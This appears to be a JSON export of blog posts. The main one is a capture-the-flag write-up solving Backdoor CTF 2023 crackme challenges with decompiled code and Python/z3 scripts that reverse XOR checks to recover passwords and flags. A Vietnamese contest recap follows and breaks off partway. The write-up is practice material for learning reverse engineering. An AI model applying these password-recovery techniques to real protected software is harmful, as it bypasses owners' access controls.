[{"content":"In this CTF, I didn\u0026rsquo;t get a chance to do many rev challenges, partly because I had too many deadlines, and also partly because my old machine was breaking down.\nOpen Sesame Attachment: open_sesame.apk\nHere is an easy challenge apk. Use Decompiler.com to decompile this apk file then check sources/com/example/open_sesame/MainActivity.java to find main logic of this file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 package com.example.open_sesame; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast; import androidx.appcompat.app.AppCompatActivity; import androidx.appcompat.app.AppCompatDelegate; public class MainActivity extends AppCompatActivity { private static final int[] valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; private static final String valid_user = \u0026#34;Jack Ma\u0026#34;; private Button buttonLogin; private EditText editTextPassword; private EditText editTextUsername; /* access modifiers changed from: protected */ public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); this.editTextUsername = (EditText) findViewById(R.id.editTextUsername); this.editTextPassword = (EditText) findViewById(R.id.editTextPassword); Button button = (Button) findViewById(R.id.buttonLogin); this.buttonLogin = button; button.setOnClickListener(new View.OnClickListener() { public void onClick(View view) { MainActivity.this.validateCredentials(); } }); } /* access modifiers changed from: private */ public void validateCredentials() { String trim = this.editTextUsername.getText().toString().trim(); String trim2 = this.editTextPassword.getText().toString().trim(); if (!trim.equals(valid_user) || !n4ut1lus(trim2)) { showToast(\u0026#34;Invalid credentials. Please try again.\u0026#34;); return; } \u0026#34;flag{\u0026#34; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34;) + \u0026#34;}\u0026#34;; } private boolean n4ut1lus(String str) { int[] it4chi = it4chi(str); if (it4chi.length != valid_password.length) { return false; } for (int i = 0; i \u0026lt; it4chi.length; i++) { if (it4chi[i] != valid_password[i]) { return false; } } return true; } private int[] it4chi(String str) { int[] iArr = new int[str.length()]; for (int i = 0; i \u0026lt; str.length(); i++) { iArr[i] = str.charAt(i); } return iArr; } private String sh4dy(String str) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str.length(); i++) { char charAt = str.charAt(i); if (Character.isDigit(charAt)) { sb.append(charAt); } } return sb.toString(); } private int sl4y3r(String str) { return Integer.parseInt(str) - 1; } private String flag(String str, String str2) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str2.length(); i++) { sb.append((char) (str2.charAt(i) ^ str.charAt(i % str.length()))); } return sb.toString(); } private void showToast(String str) { Toast.makeText(this, str, 0).show(); } } We should pay attention to some section:\n\u0026quot;flag{\u0026quot; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026quot;U|]rURuoU^PoR_FDMo@X]uBUg\u0026quot;) + \u0026quot;}\u0026quot;; valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; valid_user = \u0026quot;Jack Ma\u0026quot;; Here there are functions we need to pay attention to: it4chi, sh4dy, sl4y3r (each function has 1 different encoding, consisting only of simple calculations and xor operations) and valid_user \u0026amp; valid_password. Detail:\nit4chi get a string str as input and returns an array of integers sh4dy get a string str as input and returns a new string containing only the numeric characters from the original string sl4y3r get a string str as input, converts it to an integer using Integer.parseInt, subtracts 1 from the resulting value, and returns the result flag takes 2 strings and XOR char by char with length of shorter string Here\u0026rsquo;s my script to reverse this program to get the flag: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def get_flag(): valid_password = [52, 108, 49, 98, 97, 98, 97] valid_user = \u0026#34;Jack Ma\u0026#34; str2 = \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34; def it4chi(str): return [ord(c) for c in str] def sh4dy(str): return \u0026#39;\u0026#39;.join(c for c in str if c.isdigit()) def sl4y3r(str): return int(str) - 1 def flag(str, str2): return \u0026#39;\u0026#39;.join(chr(ord(str2[i]) ^ ord(str[i % len(str)])) for i in range(len(str2))) password = \u0026#39;\u0026#39;.join(chr(i) for i in valid_password) str1 = sh4dy(password) str_res = str1 str_res = str(sl4y3r(str_res)) return \u0026#34;flag{\u0026#34; + flag(str_res, str2) + \u0026#34;}\u0026#34; print(get_flag()) # flag{aLiBabA_and_forty_thiEveS} Secret Door Attachment:\nchall.out encoded.bin This is a C program written quite simply like to check the password and if correct, will decrypt the encoded file.bin to issue the flag image\ndump IDA (main function):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax char v5; // [rsp+13h] [rbp-EDh] BYREF int v6; // [rsp+14h] [rbp-ECh] int *v7; // [rsp+18h] [rbp-E8h] char v8[32]; // [rsp+20h] [rbp-E0h] BYREF char v9[32]; // [rsp+40h] [rbp-C0h] BYREF char v10[32]; // [rsp+60h] [rbp-A0h] BYREF char v11[32]; // [rsp+80h] [rbp-80h] BYREF int v12[18]; // [rsp+A0h] [rbp-60h] unsigned __int64 v13; // [rsp+E8h] [rbp-18h] v13 = __readfsqword(0x28u); if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } v6 = 0; std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v8); v12[0] = 66; v12[1] = 119; v12[2] = 101; v12[3] = 113; v12[4] = 123; v12[5] = 98; v12[6] = 114; v12[7] = 125; v12[8] = 119; v12[9] = 89; v12[10] = 115; v12[11] = 125; v12[12] = 111; v12[13] = 109; v12[14] = 62; v12[15] = 1; v12[16] = 0; while ( v6 \u0026lt;= 16 ) { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::push_back( v8, (unsigned int)(char)(LOBYTE(v12[v6]) ^ (v6 + 17))); ++v6; } std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9, \u0026#34;ThatsHardcoded!!!\u0026#34;, \u0026amp;v5); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v11, v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v10, v8); func_5(v10, v11); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v10); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v11); v7 = (int *)operator new[](0x44uLL); v3 = func_4(v8, argv[1]); v7 = (int *)func_3(v3, v9); if ( (unsigned __int8)func_2(v7) ) func_1(*v7, v7[16]); else std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Wrong door\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v8); return 0; } In this execute file, we must input 1 argv and length of argv is 17\n1 2 3 4 5 6 7 8 9 10 if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } In each iteration, v8 will append the value ((v12[i]) ^ (i + 17)) (i ascending) \u0026ndash;\u0026gt; v8 += chr((v12[i]) ^ (i + 17))\nwe can find v8:\n1 2 3 4 5 6 7 8 9 10 11 v6 = 0 v8 = \u0026#34;\u0026#34; v12 = [ 66, 119, 101, 113, 123, 98, 114, 125, 119, 89, 115, 125, 111, 109, 62, 1, 0 ] while v6 \u0026lt;= 16: v8 += chr(v12[v6] ^ (v6 + 17)) v6 += 1 print(v8) # v8 = \u0026#34;SeventeenChars!!!\u0026#34; The other side:\n1 2 3 std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9,\u0026#34;ThatsHardcoded!!!\u0026#34;,\u0026amp;v5); we have v9 = \u0026quot;ThatsHardcoded!!!\u0026quot;\n1. func_5\nfunc_5 is a joke hix :((( so we can ignore it (not related to the program flow), if you want decode func_5, here is raw data dumped from IDA and script\n2. func_4\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall func_4(__int64 a1, __int64 a2) { unsigned __int64 i; // [rsp+18h] [rbp-18h] unsigned __int64 v4; // [rsp+20h] [rbp-10h] __int64 v5; // [rsp+28h] [rbp-8h] v4 = std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::size(a1); v5 = operator new[](0x44uLL); for ( i = 0LL; i \u0026lt; v4; ++i ) *(v5 + 4 * i) = (*(a2 + i) ^ *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[]( a1, i)); return v5; } 3. func_3\n1 2 3 4 5 6 7 8 9 10 __int64 __fastcall func_3(__int64 a1, __int64 a2) { int i; // [rsp+14h] [rbp-Ch] __int64 v4; // [rsp+18h] [rbp-8h] v4 = operator new[](0x44uLL); for ( i = 0; i \u0026lt;= 16; ++i ) *(4LL * i + v4) = *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[](a2, i) ^ *(4LL * i + a1); return v4; } 4. func_2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 _BOOL8 __fastcall func_2(int *a1) { return *a1 == 78 \u0026amp;\u0026amp; a1[1] != (*a1 == 15) \u0026amp;\u0026amp; a1[2] == 120 \u0026amp;\u0026amp; a1[3] != (a1[2] == 31) \u0026amp;\u0026amp; a1[4] == 120 \u0026amp;\u0026amp; a1[5] != (a1[4] == 11) \u0026amp;\u0026amp; a1[6] == 116 \u0026amp;\u0026amp; a1[6] != (a1[7] == 6) \u0026amp;\u0026amp; a1[8] == 100 \u0026amp;\u0026amp; a1[9] != (a1[8] == 33) \u0026amp;\u0026amp; a1[10] == 99 \u0026amp;\u0026amp; a1[11] != (a1[10] == 34) \u0026amp;\u0026amp; a1[12] == 120 \u0026amp;\u0026amp; a1[13] == a1[12] \u0026amp;\u0026amp; a1[14] == 114 \u0026amp;\u0026amp; a1[15] == a1[14] + 1 \u0026amp;\u0026amp; a1[16] == 33; } so here is logic of func_3 \u0026amp; func_4:\n1 2 3 4 5 6 7 8 9 10 11 12 def func_4(a1, a2): v4 = len(a1) v5 = bytearray() for i in range(v4): v5.append((ord(a2[i]) ^ ord(a1[i])) % 256) return v5 def func_3(a1, a2): v4 = [0]*17 for i in range(17): v4[i] = ord(a2[i]) ^ a1[i] return v4 So we can find a1 to func_2 is True with z3 python then we can use func_3, func_4 to find key:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from z3 import * flags = [BitVec(f\u0026#39;char_{i}\u0026#39;, 8) for i in range(17)] unk1 = [BitVec(f\u0026#39;z1_{i}\u0026#39;, 8) for i in range(17)] s = Solver() s.add(len(flags) == 17) for i in range(17): s.add(And(flags[i] \u0026gt;= 33, flags[i] \u0026lt;= 125)) str1 = \u0026#34;SeventeenChars!!!\u0026#34; str2 = \u0026#34;ThatsHardcoded!!!\u0026#34; for i in range(17): unk1[i] = flags[i] ^ ord(str1[i]) for i in range(17): unk1[i] = unk1[i] ^ BitVecVal(ord(str2[i]), 8) condition = And( unk1[0] == 78, unk1[1] != If(unk1[0] == 15, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[2] == 120, unk1[3] != If(unk1[2] == 31, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[4] == 120, unk1[5] != If(unk1[4] == 11, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[6] == 116, unk1[7] != If(unk1[6] == 6, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[8] == 100, unk1[9] != If(unk1[8] == 33, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[10] == 99, unk1[11] != If(unk1[10] == 34, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[12] == 120, unk1[13] == unk1[12], unk1[14] == 114, unk1[15] == unk1[14] + 1, unk1[16] == 33 ) s.add(condition) if s.check() == sat: m = s.model() flag = \u0026#39;\u0026#39;.join([chr(m[flags[i]].as_long()) for i in range(17)]) print(f\u0026#34;Pass: {flag}\u0026#34;) else: print(\u0026#34;No solution found!\u0026#34;) # Pass: I$o0e!p0n0d0oors! When i put it like as argv it false:\nI think $ in the key is special character in Linux, so i edit this command from ./chall.out I$o0e!p0n0d0oors! to ./chall.out $(echo SSRvMGUhcDBuMGQwb29ycyE= | base64 -d) and here is the flag:\nbaby eBPF Attachment: babyebpf.o\neBPF (extended Berkeley Packet Filter) is a technology in the Linux kernel that allows the execution of custom programs within the kernel itself. These programs are typically used for monitoring and filtering network events and can be attached to various hook points in the kernel.\nIn this chall, we must use process EBPF from https://github.com/zandi/eBPF_processor to dissasemble this file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 detect_execve: mov r1, 0x1C050444 stxw [r10-8], r1 lddw r1, 0x954094701340819 stxdw [r10-0x10], r1 lddw r1, 0x10523251403E5713 stxdw [r10-0x18], r1 lddw r1, 0x43075A150E130D0B stxdw [r10-0x20], r1 mov r1, 0 LBB0_1: lddw r2, 0 add r2, r1 ldxb r2, [r2] mov r3, r10 add r3, -0x20 add r3, r1 ldxb r4, [r3] xor r2, r4 stxb [r3], r2 add r1, 1 jeq r1, 0x1C, LBB0_2 ja LBB0_1 -------------------------------------- LBB0_2: mov r3, r10 add r3, -0x20 lddw r1, 0x1C mov r2, 4 call 6 mov r0, 1 ret -------------------------------------- szmarinkitagawa:db \u0026#34;marinkitagawamarinkitagawama\u0026#34;,0 This is simple assembly code, so I have the script to get the flag, notice that the key is marinkitagawamarinkitagawama:\n1 2 3 4 5 6 7 8 9 10 11 key = \u0026#34;marinkitagawamarinkitagawama\u0026#34; data = [ 0x1C050444, 0x954094701340819, 0x10523251403E5713, 0x43075A150E130D0B ] rote = [((value \u0026gt;\u0026gt; i) \u0026amp; 0xFF) for value in reversed(data) for i in range(0, 64, 8)] flag = \u0026#39;\u0026#39;.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(rote)) print(flag) # flag{1n7r0_70_3bpf_h3h3h3eh}mari or we can guess easily xor with length of key and data xD\nSl4ydroid Attachment: sl4ydroid.apk like the Open Sesame challenge, we will use Decompiler.com to decompile this apk\nIn this challenge, during the ctf, I only completed 3/4 of flag, which is quite unfortunate\nI use jadx to decompile this apk and export lib because nothing java usefull in source :\u0026laquo;\nWhen i load libsl4ydroid.so to IDA, the first function i see RC4 hash:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 int __stdcall firsts(int a1) { unsigned int v1; // eax unsigned int v2; // eax int v4; // [esp+10h] [ebp-58h] int v5; // [esp+18h] [ebp-50h] char v6; // [esp+1Fh] [ebp-49h] unsigned int i; // [esp+30h] [ebp-38h] char v8[16]; // [esp+40h] [ebp-28h] BYREF char v9[16]; // [esp+50h] [ebp-18h] BYREF unsigned int v10; // [esp+60h] [ebp-8h] v10 = __readgsdword(0x14u); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(a1, \u0026#34;b5)c]d/ZP1:\\\u0026#34;\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v9, \u0026#34;R00rkee\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v8, \u0026#34;R1zz\u0026#34;); for ( i = 0; i \u0026lt;= sub_1AC20(a1) - 1; ++i ) { v4 = *sub_1AC50(a1, i); v1 = sub_1AC20(v9); v5 = *sub_1AC50(v9, i % v1) ^ v4; v2 = sub_1AC20(v8); v6 = *sub_1AC50(v8, i % v2) ^ v5; *sub_1AC50(a1, i) = v6; } std::string::~string(v8); std::string::~string(v9); return a1; } when i convert it to python and run, i receive b4ckd00r2023, so it will be RC4\nJava_com_backdoor_sl4ydroid_MainActivity_kim 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_kim(_JNIEnv *a1, int a2, int a3) { _BYTE *v3; // eax const char *v4; // eax int v6; // [esp+34h] [ebp-64h] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v9; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v11[8]; // [esp+58h] [ebp-40h] BYREF char v12[8]; // [esp+60h] [ebp-38h] BYREF char v13[16]; // [esp+68h] [ebp-30h] BYREF char v14[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v15; // [esp+88h] [ebp-10h] v15 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v14, \u0026amp;s1, \u0026amp;us3_m3); v9 = sub_1BCB0(v14); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v9, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v13, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); sub_1B850(v12); sub_1B8A0(v11); while ( (sub_1B910(v12, v11) \u0026amp; 1) != 0 ) { v3 = sub_1B950(v12); *v3 += 8; *v3 ^= 7u; sub_1B960(v12); } v4 = sub_1BCB0(v13); v6 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v6); _JNIEnv::DeleteLocalRef(a1, v6); std::string::~string(v13); std::string::~string(v14); return __readgsdword(0x14u); } Here is simple encrypt with +8 and ^7 so i use script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def encrypt_string(input_str, key): result = bytearray() for i in range(len(key)): encrypted_char = (ord(key[i]) + 8) ^ 7 result += encrypted_char.to_bytes(1, byteorder=\u0026#34;little\u0026#34;) return result k1 = \u0026#34;Yc^XtMfu\u0026#34; m1 = \u0026#34;d23ba52679c5e1\u0026#34; encrypted_result = encrypt_string(m1, k1) print(\u0026#34;Encrypted Result:\u0026#34;, encrypted_result.hex()) # 666c61677b52697a --\u0026gt; flag{Riz Java_com_backdoor_sl4ydroid_MainActivity_damn 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_damn(_JNIEnv *a1, int a2, int a3) { int v3; // eax const char *v4; // eax char v6; // [esp+27h] [ebp-71h] int v7; // [esp+38h] [ebp-60h] int i; // [esp+3Ch] [ebp-5Ch] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v11; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v13[16]; // [esp+58h] [ebp-40h] BYREF char v14[16]; // [esp+68h] [ebp-30h] BYREF char v15[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v16; // [esp+88h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r1, \u0026amp;us3_m3); v11 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v11, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); std::string::basic_string(v13, v14); for ( i = sub_1AC20(v13) - 1; i \u0026gt;= 0; --i ) { v6 = *sub_1AC50(v13, i) ^ 0xC; v3 = sub_1AC20(v14); *sub_1AC50(v14, v3 - 1 - i) = v6; } v4 = sub_1BCB0(v14); v7 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v7); _JNIEnv::DeleteLocalRef(a1, v7); std::string::~string(v13); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here is simple xor with 0xC and reverse strings\n1 2 3 4 5 6 7 8 9 10 11 12 def damn(k3): v14 = k3 for i in range(len(k3)-1, -1, -1): v6 = ord(k3[i]) ^ 0xC v14 = v14[:len(k3)-1-i] + chr(v6) + v14[len(k3)-1-i+1:] return v14 k3 = \u0026#34;~?z?^S8o\u0026#34; result = damn(k3) print(result) # c4_R3v3r Java_com_backdoor_sl4ydroid_MainActivity_k2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_k2(_JNIEnv *a1, int a2, int a3) { unsigned int v3; // eax const char *v4; // eax char v6; // [esp+1Ch] [ebp-6Ch] char v7; // [esp+23h] [ebp-65h] int v8; // [esp+38h] [ebp-50h] unsigned int i; // [esp+3Ch] [ebp-4Ch] int StringUTFChars; // [esp+40h] [ebp-48h] int MethodID; // [esp+4Ch] [ebp-3Ch] int v12; // [esp+50h] [ebp-38h] int ObjectClass; // [esp+54h] [ebp-34h] char v14[16]; // [esp+58h] [ebp-30h] BYREF char v15[16]; // [esp+68h] [ebp-20h] BYREF unsigned int v16; // [esp+78h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r2, \u0026amp;us3_m3); v12 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v12, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); for ( i = 0; i \u0026lt;= sub_1AC20(v14) - 1; ++i ) { v6 = *sub_1AC50(v14, i); v3 = sub_1AC20(\u0026amp;v2); v7 = *sub_1AC50(\u0026amp;v2, i % v3) ^ v6; *sub_1AC50(v14, i) = v7; } v4 = sub_1BCB0(v14); v8 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v8); _JNIEnv::DeleteLocalRef(a1, v8); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here use RC4 with %v2 corresponds to m2\n1 2 3 4 5 6 7 8 9 10 11 k4 = \u0026#34;xP78V`m?3XeL\u0026#34; r = b\u0026#34;\u0026#34; m2 = \u0026#34;May_1??\u0026#34; for i in range(len(k4)): ra = ord(m2[i % len(m2)]) ^ ord(k4[i]) r += ra.to_bytes(2, byteorder=\u0026#34;little\u0026#34;) print(r.replace(b\u0026#34;\\x00\u0026#34;,b\u0026#34;\u0026#34;)) # b\u0026#39;51Ngg_RrR!:}\u0026#39; I receive flag{Riz....c4_R3v3r51Ngg_RrR!:} and stuck with ring function in Java_com_backdoor_sl4ydroid_MainActivity_nim.\nIt\u0026rsquo;s a pity because this challenge is\u0026rsquo;t hard hix :((. We can use log in Android Studio to check flag easily xDDD (From Vietzett)\n","date":"2023-12-18T00:00:00Z","image":"/p/backdoor-ctf-2023-reverse-engineering/featured_hu1633d773772b68a8a46d663a367faa24_195597_120x120_fill_box_smart1_3.png","permalink":"/p/backdoor-ctf-2023-reverse-engineering/","title":"Backdoor CTF 2023 | Reverse Engineering"},{"content":"Post này chỉ để kể câu chuyện đội mình đi thi Cyber SEA Game 2023 tại Bangkok, Thailand (9-10/11/2023)\nCyber SEA Game 2023 (Bangkok - Thailand) Tổng quan về cuộc thi của đội Việt Nam Trong 5 phút đầu tiên, khi team Việt Nam nhận server và tài khoản cũng như thực hiện các thao tác về đổi mật khẩu và kiểm tra, chúng tôi ngạc nhiên khi thấy có tới 6 team khác đã lần lượt submit các chủ đề, nhưng chưa rõ điều gì đã xảy ra.\nCác thành viên trong đội tự quản lý khối lượng công việc một cách rõ ràng, mặc dù hơi tiếc rằng Huy và Thành, chuyên sâu về Binary và Web Exploitation, lại không có chủ đề nào liên quan đến sở trường của họ. Cụ thể:\nViệt Anh đảm nhận Cryptography và Network Hoàng Huy chịu trách nhiệm cho Hacking Challenge 1 Thái Sơn thực hiện các nhiệm vụ OSINT, Steganography, Forensic, Reversing, và Memory Chí Thành đảm nhiệm Hacking Challenge 2. Chúng tôi cảm thấy áp lực khi đội Singapore thực hiện nhanh chóng và hoàn thành trong thời gian ngắn. Tuy nhiên, RobinHust không nản chí và cố gắng hết mình để hoàn thành các thách thức của mình. Đặc biệt, các thách thức không chỉ đòi hỏi sử dụng các kỹ thuật tấn công cơ bản mà còn đòi hỏi sự sáng tạo và \u0026ldquo;cảm nhận từ giác quan\u0026rdquo; (hay còn gọi 1 cách khác là bruteforce :3):\nTrong bài Flag #03: Cracking a Zip File của chủ đề Cryptography, có một yêu cầu là phải giải mã mật khẩu openthesamesenovemberXXXX, và việc bruteforce 4 ký tự cuối có thể mất một khoảng thời gian (theo lời giải chính thức đến từ BTC). Tuy nhiên, thông qua khả năng suy luận, chúng tôi đã thử nghiệm thành công với 4 ký tự cuối là 2023, giúp quá trình trở nên nhanh chóng và dễ dàng\nHoàng Huy tấn công thành công Hacking Challenge 1, liên tục vượt qua các thách thức. Team Việt Nam đã thể hiện khả năng xuất sắc trong việc giải quyết thử thách này nhờ đọc kỹ tài liệu từ BTC và thử nghiệm trước.\nThái Sơn đã xử lý thành công các thử thách về Steganography, Memory, Reversing và mở các thử thách Forensic.\nThành đã chuyển sang hỗ trợ Sơn và Việt Anh trong các thử thách Forensic và Crypto, sau đó quay trở lại cùng Hoàng Huy để giải quyết Hacking Challenge 2.\nMọi thứ diễn ra mượt mà và suôn sẻ, đội đã hoàn thành toàn bộ các thách thức trong vòng 3 tiếng 30 phút.\nTrong cuộc thi, hầu hết các đội đều có tỉ lệ submit sai khá lớn cùng 1 lượng thời gian lãng phí quá nhiều vì phải đoán trong thử thách Flag #03 Initial execution của chủ đề điều tra số Forensic đưa ra 1 danh sách khá nhiều những flag giả mà chúng tôi phải thử để giải quyết\nPhase 1: khởi đầu của cuộc thi (Khoảng 1 tiếng từ sau khi cuộc thi bắt đầu) Đội của chúng tôi khởi đầu không mấy thuận lợi khi trở thành đội chậm nhất trong số 10 đội giải quyết thử thách đầu tiên.\nCác đội khác bắt đầu submit từng thử thách từ 12:00 và đến tận 12:22 team Việt Nam mới submit được challenge đầu của Việt Anh (Thật sự khâm phục các thành viên trong đội vì giữ được sự bình tĩnh đến không ngờ)\nSau đó các thành viên lần lượt submit các bài đầu tiên của từng chủ đề (tới lúc này vẫn giữ vị trí cuối bảng do các đội khác đã submit rất nhiều các thử thách khác từ trước đó một lúc)\nPhase 2: mid game (Khoảng 2 tiếng từ sau khi cuộc thi bắt đầu) Sau khi bị mắc kẹt ở những thử thách ban đầu, đội của chúng tôi đã khôi phục được phong độ và thành công trong việc giải quyết các thách thức tiếp theo một cách nhanh chóng.\nBứt tốc lần 1: sau khoảng 30 phút kể từ khi giải được challenge đầu 